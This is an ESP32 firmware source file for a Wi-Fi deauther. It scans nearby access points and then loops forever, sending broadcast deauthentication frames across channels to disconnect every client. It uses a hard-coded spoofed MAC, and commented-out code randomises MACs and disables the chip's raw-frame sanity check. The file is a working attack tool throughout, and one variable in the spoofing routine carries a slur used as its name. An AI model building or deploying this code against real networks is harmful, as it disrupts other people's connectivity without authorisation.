extern "C" {
#include "freertos/FreeRTOS.h"

#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_netif.h"

#include "nvs_flash.h"
#include <time.h>
#include "configure_wifi.h"
}

#include "packet.hpp"

PacketSender sender;
wifi_ap_record_t *apRecords;
//esp_err_t esp_wifi_set_mac(wifi_interface_t ifx, const uint8_t mac[6])
/*void spoof_MAC(MacAddr* pMAC ){
    //apple 98:ca:33
    unsigned char gay[3];
    for(int i = 0; i <3 ;i++){
        gay[i]= (unsigned char) rand() % 256; 
    }


    for(int i =0 ; i<3 ;i++){
        pMAC[3+i] = gay[i];
    }
        

}*/

//esp_err_t esp_wifi_scan_start(const wifi_scan_config_t *config, bool block)
//esp_err_t esp_wifi_scan_stop(void)
//esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records)
void scanWifi(){
    
    esp_wifi_scan_start(NULL,true);
    esp_wifi_scan_stop();
    uint16_t maxAP = 32; //arbitrary number max APs stored
    apRecords = new wifi_ap_record_t[maxAP];
    esp_wifi_scan_get_ap_records(&maxAP , apRecords);
}

void spam_task(void *pvParameter) {
    const MacAddr TARGET = { //target broadcast
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };
    MacAddr AP = {
        //re place with your AP's mac address
        //98:ca:33
        0x98, 0xca, 0x33, 0x32, 0x65, 0xe4
    };
    //spoof_MAC(&AP);
    scanWifi();
    
	while(1) {
        vTaskDelay(1000 / portTICK_PERIOD_MS);
        for(int i = 0; i < 32; i++){
            for(uint8_t ch = 1; ch < 11; ch++) {
                printf("Deauthing channel %d\n", ch);
                esp_err_t res;
                res = sender.deauth(TARGET, AP, apRecords[i].bssid, 1, ch);
                if(res != ESP_OK) printf("  Error: %s\n", esp_err_to_name(res));
            }
            
        }
    }
}




/*extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0; //LA FUNZIONE IMPEDISCE DI MANDARE PACCHETTI "STRANI"
}*/

extern "C" void app_main(void) {
    srand(time(NULL));

    nvs_flash_init();
    esp_netif_init();    
    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    // Init dummy AP to specify a channel and get WiFi hardware into
    // a mode where we can send the actual fake beacon frames.
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

    //ESP_ERROR_CHECK(esp32_deauther_configure_wifi(1));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    xTaskCreate(&spam_task, "spam_task", 2048 /*profondità dellostack*/, NULL, 5, NULL);
}

